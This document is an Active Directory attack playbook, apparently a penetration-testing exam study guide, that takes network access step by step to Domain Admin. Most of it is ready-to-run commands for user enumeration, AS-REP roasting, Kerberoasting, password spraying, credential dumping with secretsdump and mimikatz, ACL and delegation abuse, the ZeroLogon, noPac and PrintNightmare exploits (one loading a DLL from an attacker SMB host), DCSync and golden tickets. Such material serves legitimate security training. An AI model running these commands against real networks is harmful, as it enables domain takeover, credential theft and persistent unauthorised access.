# Active Directory Attack Methodology

A stepwise playbook from "I have network access" to Domain Admin. Run through the phases in order; do not skip phase 1 even when phase 2+ techniques look promising.

## Phase 0: Identify Domain Controllers

Domain Controllers expose a recognisable port profile. Any host with most of these open is a DC:

```
TCP 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985
UDP 53, 88, 123, 137, 138, 389
```

### Discovery

```bash
# If you don't have a full nmap yet, look for Kerberos (88) and LDAP (389)
sudo nmap -sS -p 88,389 --open 10.10.10.0/24

# Confirm DC via SMB OS discovery
sudo nmap --script smb-os-discovery -p 445 10.10.10.10
```

The output reveals:
- **Domain name** (e.g. `corp.local`)
- **Forest name**
- **Computer name** (the DC's hostname)
- **Operating system version**

Save this. You'll reference it constantly.

### Note your environment

```bash
# Pick variables you'll reuse
DC_IP=10.10.10.10
DOMAIN=corp.local
DC_HOST=dc01

# Add to /etc/hosts
echo "$DC_IP  $DC_HOST.$DOMAIN $DC_HOST $DOMAIN" | sudo tee -a /etc/hosts

# Time sync (Kerberos requires <5 min skew)
sudo ntpdate $DC_IP
# or
sudo rdate -n $DC_IP
```

---

## Phase 1: Unauthenticated Enumeration

Before authenticating, extract everything reachable without credentials. Each piece of intelligence here is leverage for phase 2.

### 1.1 SMB null session

Modern Windows blocks null sessions but Samba defaults and older Windows do not.

```bash
# Quick null session check
nxc smb $DC_IP -u '' -p ''
nxc smb $DC_IP -u 'guest' -p ''

# enum4linux-ng (most thorough)
enum4linux-ng -A $DC_IP

# rpcclient (manual)
rpcclient -U "" -N $DC_IP
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> getdompwinfo               # password policy
rpcclient $> queryuser 0x3e8            # query user by RID
rpcclient $> lookupnames administrator
rpcclient $> lookupsids S-1-5-21-...    # SID -> name
```

If null session works, you have:
- All usernames
- All groups
- Password policy (lockout threshold critically)

Save the user list to a file:

```bash
# Extract usernames from rpcclient output, or:
enum4linux-ng -U $DC_IP | grep -oP '(?<=user:\[)[^\]]+' > users.txt
```

### 1.2 RID Cycling

If null session is restricted but the host responds to lookupsid queries, RID cycling may still work:

```bash
# enum4linux-ng has built-in RID cycling
enum4linux-ng -R $DC_IP

# Impacket
impacket-lookupsid '@'$DC_IP -no-pass -domain-sids

# With creds (often more reliable)
impacket-lookupsid corp.local/user:'pass'@$DC_IP
```

### 1.3 Username enumeration via Kerberos

This is the most effective technique against modern AD: Kerberos pre-authentication failure messages distinguish "user does not exist" from "user exists, wrong password" without locking the account.

```bash
kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```

Then:
```bash
cat valid_users.txt | awk -F@ '{print $1}' > users.txt
```

### 1.4 LDAP anonymous bind / RootDSE

Even without credentials, the RootDSE is queryable on AD by default:

```bash
ldapsearch -x -H ldap://$DC_IP -s base -b "" "(objectClass=*)" "*" "+"
```

Captures:
- `defaultNamingContext` - the domain DN
- `dnsHostName` - the DC's FQDN
- `serverName` - the DC's name in the configuration
- `currentTime` - the DC's clock (for Kerberos sync)
- `supportedLDAPVersion`
- Domain functional level

### 1.5 AS-REP Roasting (no creds required!)

This is the headline attack: any account with `DONT_REQ_PREAUTH` set on it can have its hash retrieved without authentication.

```bash
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

If even one user has `DONT_REQ_PREAUTH` and a weak password, you're now authenticated.

### 1.6 Password Spray (very carefully)

If you have a user list and lockout policy is non-trivial:

```bash
# CHECK PASSWORD POLICY FIRST
nxc smb $DC_IP -u 'anyuser' -p 'anypass' --pass-pol  # may need creds

# kerbrute does NOT lock accounts on Kerberos failures (preferred)
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Spring2025!'

# Common spray candidates (ordered by frequency of success):
# - <Season><Year>! (Spring2025!, Summer2025!)
# - Welcome1, Welcome123!, Welcome2025!
# - Password1, Password123, Password2025!
# - Company-specific patterns (CompanyName1!)
# - Default service-account credentials (e.g. matching username)
```

**Never use SMB-based spray (`nxc smb`)** without explicit confirmation that lockout is permissive - SMB failures count toward lockout.

---

## Phase 2: Initial Authenticated Access

You now have at least one valid set of credentials. Time to enumerate everything.

### 2.1 Credential validation

```bash
# Validate
nxc smb $DC_IP -u jdoe -p 'Password123!'
nxc ldap $DC_IP -u jdoe -p 'Password123!'

# Test where the credentials work across the network
nxc smb 10.10.10.0/24 -u jdoe -p 'Password123!' --continue-on-success
nxc winrm 10.10.10.0/24 -u jdoe -p 'Password123!' --continue-on-success
```

`(Pwn3d!)` annotation in nxc smb output indicates **local admin access on that host**.

### 2.2 Comprehensive enumeration

```bash
# nxc bundle - run all of these
nxc smb $DC_IP -u jdoe -p 'Password123!' --users
nxc smb $DC_IP -u jdoe -p 'Password123!' --groups
nxc smb $DC_IP -u jdoe -p 'Password123!' --pass-pol
nxc smb $DC_IP -u jdoe -p 'Password123!' --shares
nxc smb $DC_IP -u jdoe -p 'Password123!' --loggedon-users
nxc smb $DC_IP -u jdoe -p 'Password123!' --rid-brute
nxc smb $DC_IP -u jdoe -p 'Password123!' --sessions

# windapsearch for AD-specific data
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' -U
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' -G
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' -C
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' --da
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' --privileged-users
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' --gpos
windapsearch -d $DOMAIN --dc-ip $DC_IP -u jdoe -p 'Password123!' --trusts

# ldapsearch for specific queries
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\jdoe" -w 'Password123!' \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description | tee ldap_users.txt

# Look for credentials in description fields - this is gold
grep -B1 description ldap_users.txt | less
```

### 2.3 BloodHound collection

```bash
bloodhound-python -u jdoe -p 'Password123!' -d $DOMAIN -ns $DC_IP -c All -o bh-output

# This produces JSON files. Import into the BloodHound GUI:
neo4j start
bloodhound &

# In the GUI:
# 1. File > Import > drag the JSON files
# 2. Click your owned user, Mark as Owned
# 3. Run query: "Find Shortest Paths from Owned to Domain Admins"
# 4. Run query: "Find Computers where Domain Users are Local Admin"
# 5. Run query: "Find Kerberoastable Users"
# 6. Run query: "Find AS-REP Roastable Users"
# 7. Run query: "Find Computers with Unconstrained Delegation"
```

The shortest-path graph **tells you what to do next**. Each edge type has a known abuse technique - BloodHound's "Help" tab on each edge documents exactly how.

### 2.4 Kerberoasting

Any authenticated user can request a TGS for any account with an SPN. Service accounts often have weak passwords.

```bash
impacket-GetUserSPNs -dc-ip $DC_IP -request $DOMAIN/jdoe:'Password123!' -outputfile spn.txt

# Crack
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# If you only see $krb5tgs$18$ (AES256), use mode 19700
hashcat -m 19700 spn.txt /usr/share/wordlists/rockyou.txt
```

Service accounts often have:
- Static, never-changed passwords
- Passwords matching the service name
- Domain-Admin-level privileges

### 2.5 AS-REP roast (with creds, more thorough than phase 1)

```bash
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/jdoe:'Password123!' -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 2.6 SMB share hunting

```bash
# Enumerate all shares across all hosts
nxc smb 10.10.10.0/24 -u jdoe -p 'Password123!' --shares

# Spider shares looking for credentials
nxc smb $TARGET_IP -u jdoe -p 'Password123!' -M spider_plus

# GPP password (Group Policy Preferences cpassword)
nxc smb $DC_IP -u jdoe -p 'Password123!' -M gpp_password

# Manual share content review for specific share
smbclient //$TARGET/Share -U "$DOMAIN\jdoe%Password123!"
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

# Or smbmap recursive
smbmap -H $TARGET -u jdoe -p 'Password123!' -R Share -A '\.txt|\.config|\.cnf|\.xml|\.bat|\.ps1|\.log'
```

Shares to always check:
- `SYSVOL` and `NETLOGON` on the DC (login scripts often contain credentials)
- `IT`, `Backup`, `Scripts`, `Shared`
- Any share with files modified recently

### 2.7 Password search in description fields

```bash
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\jdoe" -w 'Password123!' \
  -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description | grep -A1 description
```

It happens. Admins regularly write "default password set to X" in user description fields.

### 2.8 Computer description (admin-set notes)

```bash
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\jdoe" -w 'Password123!' \
  -b "DC=corp,DC=local" "(&(objectClass=computer)(description=*))" name description
```

---

## Phase 3: Credential Compromise via Lateral Movement

You have credentials. BloodHound has shown attack paths. Time to move.

### 3.1 Find hosts where current user is local admin

```bash
# nxc with current creds across the subnet - look for (Pwn3d!)
nxc smb 10.10.10.0/24 -u jdoe -p 'Password123!' --continue-on-success
```

The hosts annotated `(Pwn3d!)` are where you have local admin.

### 3.2 Lateral move

```bash
# WinRM (cleanest if 5985/5986 open)
evil-winrm -i $TARGET -u jdoe -p 'Password123!'

# Pass via Impacket
impacket-psexec $DOMAIN/jdoe:'Password123!'@$TARGET
impacket-wmiexec $DOMAIN/jdoe:'Password123!'@$TARGET    # quieter than psexec
impacket-smbexec $DOMAIN/jdoe:'Password123!'@$TARGET
impacket-atexec $DOMAIN/jdoe:'Password123!'@$TARGET 'whoami'
```

### 3.3 Dump credentials on each compromised host

```bash
# Remote, with creds
impacket-secretsdump $DOMAIN/jdoe:'Password123!'@$TARGET

# Output sections:
# - SAM hashes (local accounts)
# - LSA secrets ($MACHINE.ACC, DPAPI_SYSTEM, NL$KM)
# - Cached domain logons (DCC2 hashes - mode 2100)
# - On a DC: full NTDS.dit dump

# LSASS dump via lsassy
nxc smb $TARGET -u jdoe -p 'Password123!' -M lsassy

# Or via Mimikatz on the box
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Invoke-Binary /opt/mimikatz/mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
```

### 3.4 Test newly-found credentials network-wide

```bash
# Each new credential set, sweep the network
nxc smb 10.10.10.0/24 -u admin -p 'NewPass!' --continue-on-success
nxc smb 10.10.10.0/24 -u admin -H NTLM_HASH --local-auth --continue-on-success

# Pass-the-hash equivalents
nxc winrm 10.10.10.0/24 -u admin -H NTLM_HASH --local-auth --continue-on-success
```

A single local admin password reused across the network often equals total domain compromise.

---

## Phase 4: Domain Privilege Escalation

You have a domain account, possibly local admin on workstations. Now climb to Domain Admin.

### 4.1 ACL abuse paths from BloodHound

If BloodHound shows your owned user has any of the following ACEs on a privileged object, exploit them:

#### `GenericAll` on a user

```bash
# Reset their password
net rpc password "victim" "NewPass123!" -U "$DOMAIN/jdoe%Password123!" -S $DC_IP

# Or via Impacket
impacket-changepasswd $DOMAIN/jdoe:'Password123!'@$DC_IP -newpass 'NewPass123!' -altuser victim
```

#### `WriteDacl` on a user/group/domain

You can grant yourself DCSync rights, then dump all hashes:

```bash
impacket-dacledit -action write -rights DCSync -principal jdoe \
  -target-dn "DC=corp,DC=local" $DOMAIN/jdoe:'Password123!' -dc-ip $DC_IP

# Then DCSync
impacket-secretsdump -just-dc-ntlm $DOMAIN/jdoe:'Password123!'@$DC_IP
```

#### `WriteOwner`

Take ownership, then grant yourself ACEs:

```bash
impacket-owneredit -action write -new-owner jdoe -target victim_user \
  $DOMAIN/jdoe:'Password123!' -dc-ip $DC_IP
```

#### `AddMember` on a group

Add yourself to the group:

```bash
net rpc group addmem "Domain Admins" jdoe -U "$DOMAIN/jdoe%Password123!" -S $DC_IP

# Or
impacket-net.py user add -hashes :HASH jdoe Domain Admins
```

#### `ForceChangePassword` on a user

Same as GenericAll but specifically for password reset:

```bash
impacket-changepasswd $DOMAIN/jdoe:'Password123!'@$DC_IP -newpass 'NewPass!' -altuser victim
```

#### `WriteSPN` on a user

Set an SPN, then Kerberoast:

```bash
# Set SPN
impacket-targetedKerberoast -d $DOMAIN -u jdoe -p 'Password123!' --request-user victim
# (the tool sets a temporary SPN, kerberoasts, removes the SPN)
```

#### `GenericWrite` on a user

Lots of options:
- Set SPN -> Kerberoast
- Targeted Kerberoasting via above
- Set logon script

#### `AllowedToDelegate` (Constrained Delegation) on a computer

```bash
# If your account has constrained delegation TO a service:
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
  $DOMAIN/jdoe:'Password123!' -dc-ip $DC_IP

# Save TGT
export KRB5CCNAME=Administrator.ccache

# Use ticket
impacket-psexec -k -no-pass administrator@target.corp.local
```

#### `AllowedToActOnBehalfOfOtherIdentity` (Resource-Based Constrained Delegation)

If you have GenericAll/Write on a computer object, you can configure RBCD:

```bash
# 1. Add a fake computer account (any domain user can do this by default!)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'EvilPass!' \
  $DOMAIN/jdoe:'Password123!' -dc-ip $DC_IP

# 2. Set RBCD on target so EVIL$ can impersonate
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
  -dc-ip $DC_IP "$DOMAIN/jdoe:Password123!"

# 3. Get a service ticket as Administrator
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
  $DOMAIN/'EVIL$':'EvilPass!' -dc-ip $DC_IP

# 4. Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass administrator@target.corp.local
```

### 4.2 Unconstrained Delegation

If a computer account has unconstrained delegation, any user authenticating to it leaves their TGT cached on it. Coerce a DC to authenticate:

```bash
# 1. Compromise the unconstrained-delegation computer (you need local admin)
# 2. Run rubeus to monitor
.\Rubeus.exe monitor /interval:5

# 3. Coerce DC auth via PetitPotam or PrinterBug
python3 PetitPotam.py <unconstrained_host> $DC_IP

# 4. Rubeus captures the DC's TGT
# 5. Use it for DCSync
```

### 4.3 Specific Vulnerabilities

#### ZeroLogon (CVE-2020-1472)

If the DC is unpatched (pre-Aug 2020), you can blank the DC machine account password and DCSync:

```bash
git clone https://github.com/SecuraBV/CVE-2020-1472
python3 zerologon_tester.py $DC_HOST $DC_IP

# If vulnerable:
git clone https://github.com/dirkjanm/CVE-2020-1472
python3 cve-2020-1472-exploit.py $DC_HOST $DC_IP

# Now the DC's machine account has empty password
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  '$DC_HOST$@'$DC_IP

# IMPORTANT: restore the password after! Otherwise the DC breaks.
python3 restorepassword.py $DC_HOST -target-ip $DC_IP -hexpass <original_hex>
```

#### NoPac (CVE-2021-42278 + CVE-2021-42287)

```bash
git clone https://github.com/Ridter/noPac
python3 noPac.py $DOMAIN/jdoe:'Password123!' -dc-ip $DC_IP \
  --impersonate Administrator -shell
```

#### PrintNightmare (CVE-2021-1675 / 34527)

```bash
# Detection
nxc smb $DC_IP -u jdoe -p 'Password123!' -M printnightmare

# Exploitation requires:
# - SMB share where you can drop a DLL
# - The Print Spooler running on the target

# msfvenom -p windows/x64/exec CMD='net user attacker Password! /add /domain' -f dll -o evil.dll
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py $DOMAIN/jdoe:'Password123!'@$DC_IP '\\10.10.14.5\share\evil.dll'
```

#### sAMAccountName / KrbRelayUp

If you have any low-priv user and an unpatched DC:

```bash
git clone https://github.com/Dec0ne/KrbRelayUp
.\KrbRelayUp.exe full -d $DOMAIN -dc $DC_HOST.corp.local
```

---

## Phase 5: Domain Admin / Forest Admin

You're DA. Wrap up cleanly.

### 5.1 Get krbtgt for Golden Ticket

```bash
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/jdoe:'Password123!'@$DC_IP

# Output:
# krbtgt:502:aad3b435...:HASH:::

# Now you can forge tickets for any user, including non-existent ones.
```

### 5.2 Forge a Golden Ticket

```bash
# Get domain SID
impacket-lookupsid $DOMAIN/jdoe:'Password123!'@$DC_IP | head -2

# Forge
impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... \
  -domain $DOMAIN fakeadmin

export KRB5CCNAME=fakeadmin.ccache
impacket-psexec -k -no-pass fakeadmin@$DC_HOST.corp.local
```

### 5.3 Dump everything (NTDS.dit)

```bash
# Full DCSync of all NTLM hashes
impacket-secretsdump -just-dc-ntlm $DOMAIN/jdoe:'Password123!'@$DC_IP -outputfile ntds_dump

# Includes:
# - All user hashes (for offline cracking or pass-the-hash)
# - All computer hashes
# - krbtgt hash (for golden tickets)
# - Trust account hashes (for cross-domain attacks if forest)
```

### 5.4 Persistence (out of scope for CRT exam typically)

For real engagements:
- Golden ticket creation
- DCShadow
- Skeleton key
- AdminSDHolder
- Backup operators group

These are noted only for completeness; on the CRT they're rarely needed.

---

## The "Forest" Box Walkthrough Pattern

This is the canonical AD attack chain that most exam-style boxes reduce to:

```bash
# 1. Identify DC, set vars
DC_IP=10.10.10.161; DOMAIN=htb.local

# 2. SMB null session enum
nxc smb $DC_IP -u '' -p '' --users
# -> get user list -> users.txt

# 3. AS-REP roast
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/ -usersfile users.txt -no-pass \
  -format hashcat -outputfile asrep.txt

# 4. Crack
hashcat -m 18200 asrep.txt rockyou.txt
# -> svc-alfresco:s3rvice

# 5. Initial foothold via WinRM
evil-winrm -i $DC_IP -u svc-alfresco -p s3rvice

# 6. BloodHound
bloodhound-python -u svc-alfresco -p s3rvice -d $DOMAIN -ns $DC_IP -c All

# 7. Path: svc-alfresco -> Account Operators -> WriteDacl on htb.local
# 8. Add yourself with WriteDacl, then DCSync
impacket-dacledit -action write -rights DCSync -principal svc-alfresco \
  -target-dn "DC=htb,DC=local" $DOMAIN/svc-alfresco:s3rvice -dc-ip $DC_IP
impacket-secretsdump -just-dc-ntlm $DOMAIN/svc-alfresco:s3rvice@$DC_IP

# 9. Pass the Administrator hash
evil-winrm -i $DC_IP -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

That's null session → AS-REP roast → hash crack → WinRM → BloodHound → ACL abuse → DCSync → pass-the-hash → DA. Memorise the rhythm.

---

## Quick Reference: Tool Parameter Patterns

```bash
# Authentication formats - reused across Impacket and others:

# Username + Password
$DOMAIN/jdoe:'Password123!'

# Pass the hash
$DOMAIN/jdoe -hashes :NTLM_HASH
$DOMAIN/jdoe -hashes LM_HASH:NTLM_HASH

# Pass the ticket (Kerberos)
-k -no-pass         # uses ticket from KRB5CCNAME

# Empty password
$DOMAIN/jdoe:''

# AES key (more advanced - alternative to pass-the-hash for Kerberos)
-aesKey <AES256-key>
```

```bash
# DC IP specification - reused across tools:
-dc-ip 10.10.10.10
--dc 10.10.10.10
-target-ip 10.10.10.10
```

---

## Final Notes

- **Always start with phase 1** even if you have credentials. The unauthenticated enumeration informs everything that follows.
- **BloodHound is not optional** for non-trivial AD environments. Run it as soon as you have any credentials, even low-priv.
- **Document every credential** you find. The single highest-leverage activity in AD pen testing is testing each credential against every service (`nxc smb 10.10.10.0/24 -u X -p Y`).
- **Never skip checking `(Pwn3d!)`** - it tells you which boxes to focus on.
- **Time matters in Kerberos** - if you get clock skew errors, sync to the DC.
- **The exam-realistic path is generally**: null session → user enum → AS-REP/Kerberoast → hash crack → low-priv shell → BloodHound → ACL abuse → DCSync → DA.
